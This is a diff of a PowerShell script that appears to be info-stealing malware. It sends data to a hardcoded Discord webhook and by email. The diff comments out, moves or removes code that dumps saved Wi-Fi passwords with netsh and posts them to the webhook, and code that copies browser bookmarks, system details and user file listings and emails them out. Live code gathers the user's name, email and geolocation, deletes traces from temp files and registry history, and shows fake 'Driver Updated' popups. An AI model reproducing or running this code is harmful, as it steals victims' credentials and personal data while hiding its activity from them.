@@ -3,7 +3,7 @@ Start-Transcript -Path "$env:TEMP\example-logs.txt" -Append
 
 $global:isEmailSent = $false
 $webhookUrl = 'https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'
-$totalSteps = 5
+$totalSteps = 2
 $currentDateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 function SetEmailSentTrue {$global:isEmailSent = $true}
 function SetEmailSentFalse {$global:isEmailSent = $false}
@@ -183,170 +183,6 @@ function RunWBPV {
         Write-Host "Operation $step / $totalSteps is done."
         SetEmailSentFalse
 }
-# function GetWifiPasswords {
-#     $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
-
-#     $results = @()
-
-#     foreach ($profile in $wifiProfiles) {
-#         $profileDetails = netsh wlan show profile name="$profile" key=clear
-#         $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
-#         $results += [PSCustomObject]@{
-#             ProfileName = $profile
-#             KeyContent  = $keyContent
-#         }
-#     }
-
-#     $results | Format-Table -AutoSize
-
-#     # Save results to a file
-#     $results | Out-File -FilePath "$env:TEMP\Wifi.txt"
-
-#     # Email file
-#     if (-not $isEmailsent) {
-#         $subject = "$env:USERNAME: Netsh Profiles - Sent on $currentDateTime"
-#         $attachments = @("$env:TEMP\Wifi.txt")  # Array of attachment file paths
-#         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-#     }
-
-#     if (-not $isEmailsent) {
-#         foreach ($profile in $profiles) {
-#             $wlan = $profile.Matches.Value
-            
-#             # Extract the Wi-Fi password
-#             try {
-#                 $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
-#             } catch {
-#                 Write-Host "Failed to retrieve password for $wlan"
-#                 $passw = "N/A" # Assign a placeholder if password retrieval fails
-#             }
-    
-#             # Build the message body for the webhook
-#             $Body = @{
-#                 'username' = $env:username + " | " + [string]$wlan
-#                 'content'  = [string]$passw
-#             }
-    
-#             # Send the data to the Discord webhook
-#             try {
-#                 Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
-#                 Write-Host "Sending to Captain hook"
-#             } catch {
-#                 Write-Host "Failed to send data to Discord webhook. Operation " + $step + "/" + $totalSteps
-#             }
-
-#             # Increment to the next profile
-#             $currentProfile++
-#             Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
-#         }
-
-#     }
-
-#     SetEmailSentFalse
-# }
-# function GatherSystemInfo {
-#     $sysInfoDir = "$env:TEMP\SystemInfo"
-#     if (-Not (Test-Path $sysInfoDir)) {
-#         New-Item -ItemType Directory -Path $sysInfoDir
-#     }
-
-#     Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
-#     Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
-#     Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
-#     Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
-
-#     if (-not $isEmailsent) {
-#         $subject = "$env:USERNAME: System Info - Sent on $currentDateTime"
-#         $attachments = @("$sysInfoDir\computer_info.txt","$sysInfoDir\process_list.txt","$sysInfoDir\service_list.txt","$sysInfoDir\network_config.txt")  # Array of attachment file paths
-#         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-#     }
-    
-#     SetEmailSentFalse
-# }
-# function ShowTree {
-#     param (
-#         [string]$Path = "C:\Users",
-#         [string]$OutputFile = "$env:TEMP\tree.txt"  # Change this path as needed
-#     )
-
-#     # Collect tree structure
-#     $treeOutput = Get-ChildItem -Path $Path -Recurse -File -ErrorAction SilentlyContinue |
-#         Where-Object { -not ($_.Attributes -match "System") } |
-#         ForEach-Object {
-#             $relativePath = $_.FullName.Replace($Path, "").TrimStart("\")
-#             $depth = ($relativePath -split "\\").Count
-#             "{0}{1}" -f (" " * ($depth - 1) * 2), $relativePath
-#         }
-
-#     # Save to file
-#     $treeOutput | Out-File -FilePath $OutputFile -Encoding UTF8
-
-#     # Optional: Display a message
-#     Write-Output "Tree structure saved to $OutputFile"
-
-#     # SEND to EMAIL or WEBHOOK
-#     if (-not $isEmailSent) {
-#         # Email parameters
-#         $subject = "$env:USERNAME: Tree Show - Sent on $currentDateTime"
-#         $attachments = @("$env:TEMP\tree.txt")  # Array of attachment file paths
-#         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-#     } 
-
-#     SetEmailSentFalse
-# }
-function GetBookmarks {
-    # See if file is a thing
-    Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf
-
-    #If the file does not exist, write to host.
-    if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf)) {
-        try {
-            Write-Host "The chrome bookmark file has not been found. "
-        }
-        catch {
-            throw $_.Exception.Message
-        }
-    }
-    # Copy Chrome Bookmarks to Bash Bunny
-    else {
-        $F1 = "chrome_bookmarks.txt"
-        Copy-Item "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -Destination "$env:TEMP/$F1" 
-            # SEND to EMAIL or WEBHOOK
-            if (-not $isEmailSent) {
-                # Email parameters
-                $subject = "$env:USERNAME: Chrome Bookmarks - Sent on $currentDateTime"
-                $attachments = @("$env:TEMP\chrome_bookmarks.txt")  # Array of attachment file paths
-                Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-            } 
-        }
-
-    # See if file is a thing
-    Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -PathType Leaf
-
-    #If the file does not exist, write to host.
-    if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -PathType Leaf)) {
-        try {
-            Write-Host "The edge bookmark file has not been found. "
-        }
-        catch {
-            throw $_.Exception.Message
-        }
-    }
-    # Copy Chrome Bookmarks to Bash Bunny
-    else {
-        $F2 = "edge_bookmarks.txt"
-        Copy-Item "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -Destination "$env:tmp/$F2" 
-            # SEND to EMAIL or WEBHOOK
-            if (-not $isEmailSent) {
-                # Email parameters
-                $subject = "$env:USERNAME: Edge Bookmarks - Sent on $currentDateTime"
-                $attachments = @("$env:TEMP\edge_bookmarks.txt")  # Array of attachment file paths
-                Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-            } 
-    }
-
-    SetEmailSentFalse
-}
 function ClearCache {
 
     #email log file
@@ -362,22 +198,18 @@ function ClearCache {
     Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
     Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
     Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
-    # GetWifiPasswords
-    Remove-Item "$env:TEMP\wifi.txt" -Force -ErrorAction SilentlyContinue
-    # GatherSystemInfo
-    $tempFolderPath = [System.IO.Path]::GetTempPath()
-    $folderToDelete = Join-Path -Path $tempFolderPath -ChildPath "SystemInfo"
-    Remove-Item -Path $folderToDelete -Recurse -Force -ErrorAction SilentlyContinue
-    # Remove-Item "$sysInfoDir\computer_info.txt" -Force -ErrorAction SilentlyContinue
-    # Remove-Item "$sysInfoDir\process_list.txt" -Force -ErrorAction SilentlyContinue
-    # Remove-Item "$sysInfoDir\service_list.txt" -Force -ErrorAction SilentlyContinue
-    # Remove-Item "$sysInfoDir\network_config.txt" -Force -ErrorAction SilentlyContinue
+    # # GetWifiPasswords
+    # Remove-Item "$env:TEMP\wifi.txt" -Force -ErrorAction SilentlyContinue
+    # # GatherSystemInfo
+    # $tempFolderPath = [System.IO.Path]::GetTempPath()
+    # $folderToDelete = Join-Path -Path $tempFolderPath -ChildPath "SystemInfo"
+    # Remove-Item -Path $folderToDelete -Recurse -Force -ErrorAction SilentlyContinue
     # ShowTree
-    Remove-Item "$env:TEMP\tree.txt" -Force -ErrorAction SilentlyContinue
+    # Remove-Item "$env:TEMP\tree.txt" -Force -ErrorAction SilentlyContinue
     Remove-Item "$env:TEMP\example-logs.txt" -Force -ErrorAction SilentlyContinue
-    # Get Bookmarks
-    Remove-Item "$env:TEMP\chrome_bookmarks.txt" -Force -ErrorAction SilentlyContinue
-    Remove-Item "$env:TEMP\edge_bookmarks.txt" -Force -ErrorAction SilentlyContinue
+    # # Get Bookmarks
+    # Remove-Item "$env:TEMP\chrome_bookmarks.txt" -Force -ErrorAction SilentlyContinue
+    # Remove-Item "$env:TEMP\edge_bookmarks.txt" -Force -ErrorAction SilentlyContinue
 
     # Delete run box history
     reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
@@ -393,18 +225,10 @@ function Get-fullName {
     catch { Write-Error "No name was detected";return $env:UserName;-ErrorAction SilentlyContinue } # If no name is detected function will return $env:UserName # Write Error is just for troubleshooting 
     return $fullName 
 }
-$FN = Get-fullName
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
 function Get-email {
     try {$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim();return $email}
     catch {Write-Error "An email was not found";return "No Email Detected";-ErrorAction SilentlyContinue} # If no email is detected function will return backup message for sapi speak # Write Error is just for troubleshooting 
 }
-$EM = Get-email
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
 function Get-GeoLocation{
 	try {
 	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
@@ -428,9 +252,10 @@ function Get-GeoLocation{
     } 
 
 }
-$GL = Get-GeoLocation
-
 function Recon{
+    $FN = Get-fullName
+    $EM = Get-email
+    $GL = Get-GeoLocation
     ############################################################################################################################################################
 
     # Get nearby wifi networks
@@ -706,11 +531,9 @@ for ($step = 1; $step -le $totalSteps; $step++) {
     # Perform your operation here
     switch ($step) {
 
-        1 { RunWBPV }
-        2 { Recon }
-        3 { GetBookmarks }
-        4 { }
-        5 { }
+        1 { RunWBPV; $done = New-Object -ComObject Wscript.Shell;$done.Popup("Driver Updated",1) }
+        2 { Recon; $done = New-Object -ComObject Wscript.Shell;$done.Popup("System Updated",1) }
+
     }
 }
 
@@ -719,4 +542,168 @@ Stop-Transcript
 
 ClearCache
 
-$done = New-Object -ComObject Wscript.Shell;$done.Popup("Driver Updated",1)
+#-------------------------------------------------------------------------
+# function GetWifiPasswords {
+#     $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
+
+#     $results = @()
+
+#     foreach ($profile in $wifiProfiles) {
+#         $profileDetails = netsh wlan show profile name="$profile" key=clear
+#         $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
+#         $results += [PSCustomObject]@{
+#             ProfileName = $profile
+#             KeyContent  = $keyContent
+#         }
+#     }
+
+#     $results | Format-Table -AutoSize
+
+#     # Save results to a file
+#     $results | Out-File -FilePath "$env:TEMP\Wifi.txt"
+
+#     # Email file
+#     if (-not $isEmailsent) {
+#         $subject = "$env:USERNAME: Netsh Profiles - Sent on $currentDateTime"
+#         $attachments = @("$env:TEMP\Wifi.txt")  # Array of attachment file paths
+#         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+#     }
+
+#     if (-not $isEmailsent) {
+#         foreach ($profile in $profiles) {
+#             $wlan = $profile.Matches.Value
+            
+#             # Extract the Wi-Fi password
+#             try {
+#                 $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
+#             } catch {
+#                 Write-Host "Failed to retrieve password for $wlan"
+#                 $passw = "N/A" # Assign a placeholder if password retrieval fails
+#             }
+    
+#             # Build the message body for the webhook
+#             $Body = @{
+#                 'username' = $env:username + " | " + [string]$wlan
+#                 'content'  = [string]$passw
+#             }
+    
+#             # Send the data to the Discord webhook
+#             try {
+#                 Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
+#                 Write-Host "Sending to Captain hook"
+#             } catch {
+#                 Write-Host "Failed to send data to Discord webhook. Operation " + $step + "/" + $totalSteps
+#             }
+
+#             # Increment to the next profile
+#             $currentProfile++
+#             Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
+#         }
+
+#     }
+
+#     SetEmailSentFalse
+# }
+# function GatherSystemInfo {
+#     $sysInfoDir = "$env:TEMP\SystemInfo"
+#     if (-Not (Test-Path $sysInfoDir)) {
+#         New-Item -ItemType Directory -Path $sysInfoDir
+#     }
+
+#     Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
+#     Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
+#     Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
+#     Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
+
+#     if (-not $isEmailsent) {
+#         $subject = "$env:USERNAME: System Info - Sent on $currentDateTime"
+#         $attachments = @("$sysInfoDir\computer_info.txt","$sysInfoDir\process_list.txt","$sysInfoDir\service_list.txt","$sysInfoDir\network_config.txt")  # Array of attachment file paths
+#         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+#     }
+    
+#     SetEmailSentFalse
+# }
+# function ShowTree {
+#     param (
+#         [string]$Path = "C:\Users",
+#         [string]$OutputFile = "$env:TEMP\tree.txt"  # Change this path as needed
+#     )
+
+#     # Collect tree structure
+#     $treeOutput = Get-ChildItem -Path $Path -Recurse -File -ErrorAction SilentlyContinue |
+#         Where-Object { -not ($_.Attributes -match "System") } |
+#         ForEach-Object {
+#             $relativePath = $_.FullName.Replace($Path, "").TrimStart("\")
+#             $depth = ($relativePath -split "\\").Count
+#             "{0}{1}" -f (" " * ($depth - 1) * 2), $relativePath
+#         }
+
+#     # Save to file
+#     $treeOutput | Out-File -FilePath $OutputFile -Encoding UTF8
+
+#     # Optional: Display a message
+#     Write-Output "Tree structure saved to $OutputFile"
+
+#     # SEND to EMAIL or WEBHOOK
+#     if (-not $isEmailSent) {
+#         # Email parameters
+#         $subject = "$env:USERNAME: Tree Show - Sent on $currentDateTime"
+#         $attachments = @("$env:TEMP\tree.txt")  # Array of attachment file paths
+#         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+#     } 
+
+#     SetEmailSentFalse
+# }
+# function GetBookmarks {
+#     # See if file is a thing
+#     Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf
+
+#     #If the file does not exist, write to host.
+#     if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf)) {
+#         try {
+#             Write-Host "The chrome bookmark file has not been found. "
+#         }
+#         catch {
+#             throw $_.Exception.Message
+#         }
+#     }
+#     # Copy Chrome Bookmarks to Bash Bunny
+#     else {
+#         $F1 = "chrome_bookmarks.txt"
+#         Copy-Item "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -Destination "$env:TEMP/$F1" 
+#             # SEND to EMAIL or WEBHOOK
+#             if (-not $isEmailSent) {
+#                 # Email parameters
+#                 $subject = "$env:USERNAME: Chrome Bookmarks - Sent on $currentDateTime"
+#                 $attachments = @("$env:TEMP\chrome_bookmarks.txt")  # Array of attachment file paths
+#                 Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+#             } 
+#         }
+
+#     # See if file is a thing
+#     Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -PathType Leaf
+
+#     #If the file does not exist, write to host.
+#     if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -PathType Leaf)) {
+#         try {
+#             Write-Host "The edge bookmark file has not been found. "
+#         }
+#         catch {
+#             throw $_.Exception.Message
+#         }
+#     }
+#     # Copy Chrome Bookmarks to Bash Bunny
+#     else {
+#         $F2 = "edge_bookmarks.txt"
+#         Copy-Item "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -Destination "$env:tmp/$F2" 
+#             # SEND to EMAIL or WEBHOOK
+#             if (-not $isEmailSent) {
+#                 # Email parameters
+#                 $subject = "$env:USERNAME: Edge Bookmarks - Sent on $currentDateTime"
+#                 $attachments = @("$env:TEMP\edge_bookmarks.txt")  # Array of attachment file paths
+#                 Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+#             } 
+#     }
+
+#     SetEmailSentFalse
+# }
